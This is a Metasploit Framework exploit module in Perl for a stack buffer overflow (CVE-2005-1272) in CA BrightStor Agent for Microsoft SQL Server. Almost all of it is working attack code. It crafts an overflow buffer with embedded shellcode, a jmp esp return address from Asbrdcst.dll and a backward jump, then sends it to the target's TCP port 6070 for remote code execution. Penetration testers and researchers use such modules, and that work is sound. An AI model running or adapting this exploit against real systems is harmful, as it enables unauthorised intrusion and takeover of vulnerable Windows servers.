##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_sqlagent;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CA BrightStor Agent for Microsoft SQL Overflow',
	'Version'  => '$Revision: 1.4 $',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6070],
	  },

	'Payload' =>
	  {
		'Space'     => 1000,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA BrightStor
		Agent for Microsoft SQL Server. This vulnerability was discovered
		by cybertronic[at]gmx.net.
}),

	'Refs'    =>
	  [
	  	[ 'CVE', '2005-1272' ],
	  	[ 'BID', '14453' ],
	  	[ 'URL', 'http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities' ],
		[ 'URL', 'http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239' ],
	  ],

	'Targets' =>
	  [

		# This exploit requires a jmp esp for return
		['Asbrdcst.dll 12/12/2003',  0x20c11d64],

		# ['Windows XP SP2 ntdll.dll', 0x7c941eed],
	  ],

	'Keys'    => ['brightstor'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	# 3288 bytes max
	#  696 == good data (1228 bytes contiguous) @ 0293f5e0
	# 3168 == return address
	# 3172 == esp @ 0293ff8c (2476 from good data)

	my $poof = Pex::Text::EnglishText(3288);

	substr($poof,  696, length($shellcode), $shellcode);
	substr($poof, 3168, 4, pack('V', $target->[1])); # jmp esp
	substr($poof, 3172, 5, "\xe9\x4f\xf6\xff\xff");	 # jmp -2476

	$self->PrintLine("[*] Sending " .length($poof) . " bytes to remote host.");
	$s->Send($poof);

	# Closing the socket too early breaks the exploit
	$s->Recv(-1, 5);

	return;
}

1;

